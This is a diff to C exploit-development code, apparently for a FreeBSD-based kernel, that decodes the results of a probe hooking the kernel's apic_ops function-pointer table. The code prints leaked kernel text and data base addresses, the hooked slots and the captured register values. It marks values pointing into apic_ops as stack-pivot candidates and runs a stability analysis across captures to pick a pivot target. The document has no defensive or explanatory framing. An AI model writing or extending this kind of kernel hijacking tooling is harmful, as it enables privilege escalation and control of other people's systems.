@@ -183,24 +183,123 @@ static void _kldload(void* data, size_t data_size)
     } else if (magic == 0x52454750) { /* "REGP" - register probe results */
         uint32_t status = (uint32_t)(readback[0] >> 32);
 
-        /* Detect v2 (multi-capture): sentinel at slot 6 + 4*17 = slot 74 */
-        int is_v2 = (readback[74] == 0xdeadbeefcafe0002ULL);
+        /* Detect v3: sentinel at slot 104 = 0xdeadbeefcafe0003 */
+        int is_v3 = (readback[104] == 0xdeadbeefcafe0003ULL);
+        /* Detect v2: sentinel at slot 74 = 0xdeadbeefcafe0002 */
+        int is_v2 = !is_v3 && (readback[74] == 0xdeadbeefcafe0002ULL);
+
+        static const char* rnames[] = {
+            "RAX", "RBX", "RCX", "RDX", "RSI", "RDI", "RBP", "R8 ",
+            "R9 ", "R10", "R11", "R12", "R13", "R14", "R15", "RSP", "FLG"
+        };
+
+        static const char* slot_names[] = {
+            "create", "init", "xapic_mode", "is_x2apic",
+            "setup", "dump", "disable", "set_id",
+            "ipi_raw", "ipi_vectored", "ipi_wait", "ipi_alloc",
+            "ipi_free", "set_lvt_mask", "set_lvt_mode", "set_lvt_polarity",
+            "set_lvt_triggermode", "lvt_eoi_clear", "set_tpr", "get_timer_freq",
+            "timer_enable_intr", "timer_disable_intr", "timer_set_divisor",
+            "timer_initial_count", "timer_current_count", "self_ipi",
+            "slot26", "slot27"
+        };
 
         printf("\n=== REGISTER PROBE RESULTS ===\n");
-        printf("  status:        %s\n", status == 1 ? "SUCCESS" : "NO CAPTURES");
+        printf("  status:        %s\n",
+               status == 1 ? "CAPTURES" : status == 2 ? "TABLE ONLY" : "NO CAPTURES");
         printf("  kdata_base:    %#lx\n", readback[1]);
         printf("  ktext_base:    %#lx\n", readback[2]);
         printf("  apic_ops @:    %#lx\n", readback[3]);
         printf("  orig xapic:    %#lx\n", readback[4]);
 
-        if (is_v2) {
+        if (is_v3) {
+            uint32_t call_count = ((uint32_t*)&readback[5])[0];
+            uint32_t hooked_slot = ((uint32_t*)&readback[5])[1];
+            uint64_t slots_tried = readback[34];
+            uint64_t slots_hit = readback[35];
+
+            printf("  captures:      %u\n", call_count);
+            printf("  hooked_slot:   %u (%s)\n", hooked_slot,
+                   hooked_slot < 28 ? slot_names[hooked_slot] : "none");
+
+            /* Show apic_ops table dump (slots 6..33) */
+            uint64_t ktext = readback[2];
+            printf("\n  --- apic_ops table dump ---\n");
+            for (int i = 0; i < 28; i++) {
+                uint64_t ptr = readback[6 + i];
+                if (ptr == 0) continue;
+                int tried = (slots_tried >> i) & 1;
+                int hit = (slots_hit >> i) & 1;
+                const char* probe_note = "";
+                if (hit) probe_note = " [HOOKED - GOT CAPTURES]";
+                else if (tried) probe_note = " [tried - no calls]";
+                printf("  [%2d] %-22s %#lx (ktext+%#lx)%s\n",
+                       i, slot_names[i], ptr, ptr - ktext, probe_note);
+            }
+
+            printf("\n  Slots tried: ");
+            for (int i = 0; i < 28; i++)
+                if ((slots_tried >> i) & 1)
+                    printf("%s(%d) ", slot_names[i], i);
+            printf("\n  Slots hit:   ");
+            if (slots_hit == 0) printf("(none)");
+            for (int i = 0; i < 28; i++)
+                if ((slots_hit >> i) & 1)
+                    printf("%s(%d) ", slot_names[i], i);
+            printf("\n");
+
+            /* Register captures (slots 36+) */
+            uint64_t apic_addr = readback[3];
+            uint64_t kdata = readback[1];
+
+            for (uint32_t c = 0; c < call_count && c < 4; c++) {
+                printf("\n  --- Capture %u ---\n", c);
+                for (int i = 0; i < 17; i++) {
+                    uint64_t val = readback[36 + c * 17 + i];
+                    const char* note = "";
+                    if (i == 16) {
+                        printf("    %s: %#018lx\n", rnames[i], val);
+                        continue;
+                    }
+                    if (val == apic_addr)
+                        note = " <-- apic_ops table! PIVOT CANDIDATE";
+                    else if (val >= apic_addr && val <= apic_addr + 0xE0)
+                        note = " <-- inside apic_ops! PIVOT CANDIDATE";
+                    else if (val >= ktext && val < kdata)
+                        note = " [ktext]";
+                    else if (val >= kdata && val < kdata + 0x10000000)
+                        note = " [kdata]";
+                    else if ((val >> 40) == 0xffffff)
+                        note = " [kern_heap]";
+                    else if ((val >> 40) == 0xffffd7 || (val >> 40) == 0xffffe0 ||
+                             (val >> 40) == 0xffff80 || (val >> 40) == 0xffffee)
+                        note = " [dmap/kernel]";
+                    printf("    %s: %#018lx%s\n", rnames[i], val, note);
+                }
+            }
+
+            /* Stability analysis */
+            if (call_count >= 2) {
+                printf("\n  --- Stability Analysis ---\n");
+                for (int i = 0; i < 16; i++) {
+                    int stable = 1;
+                    uint64_t first = readback[36 + i];
+                    for (uint32_t c = 1; c < call_count && c < 4; c++) {
+                        if (readback[36 + c * 17 + i] != first) {
+                            stable = 0;
+                            break;
+                        }
+                    }
+                    if (stable && first != 0)
+                        printf("    %s: STABLE at %#018lx%s\n", rnames[i], first,
+                               (first == apic_addr || (first >= apic_addr && first <= apic_addr + 0xE0))
+                               ? " *** PIVOT TARGET ***" : "");
+                }
+            }
+        } else if (is_v2) {
             uint32_t call_count = ((uint32_t*)&readback[5])[0];
             printf("  captures:      %u (natural kernel calls)\n", call_count);
 
-            static const char* rnames[] = {
-                "RAX", "RBX", "RCX", "RDX", "RSI", "RDI", "RBP", "R8 ",
-                "R9 ", "R10", "R11", "R12", "R13", "R14", "R15", "RSP", "FLG"
-            };
             uint64_t apic_addr = readback[3];
             uint64_t ktext = readback[2];
             uint64_t kdata = readback[1];
@@ -222,14 +321,10 @@ static void _kldload(void* data, size_t data_size)
                         note = " [kdata]";
                     else if ((val >> 40) == 0xffffff)
                         note = " [kern_heap]";
-                    else if ((val >> 40) == 0xffffd7 || (val >> 40) == 0xffffe0 ||
-                             (val >> 40) == 0xffff80 || (val >> 40) == 0xffffee)
-                        note = " [dmap/kernel]";
                     printf("    %s: %#018lx%s\n", rnames[i], val, note);
                 }
             }
 
-            /* Analysis: which registers are stable across captures? */
             if (call_count >= 2) {
                 printf("\n  --- Stability Analysis ---\n");
                 for (int i = 0; i < 16; i++) {
@@ -243,15 +338,11 @@ static void _kldload(void* data, size_t data_size)
                     }
                     if (stable && first != 0)
                         printf("    %s: STABLE at %#018lx%s\n", rnames[i], first,
-                               first == apic_addr ? " *** PIVOT TARGET ***" : "");
+                               first == readback[3] ? " *** PIVOT TARGET ***" : "");
                 }
             }
         } else if (status == 1) {
-            /* v1 format (single capture at slot 5) */
-            static const char* rnames[] = {
-                "RAX", "RBX", "RCX", "RDX", "RSI", "RDI", "RBP", "R8 ",
-                "R9 ", "R10", "R11", "R12", "R13", "R14", "R15", "RSP"
-            };
+            /* v1 format */
             uint64_t apic_addr = readback[3];
             printf("\n  Registers at xapic_mode entry:\n");
             for (int i = 0; i < 16; i++) {
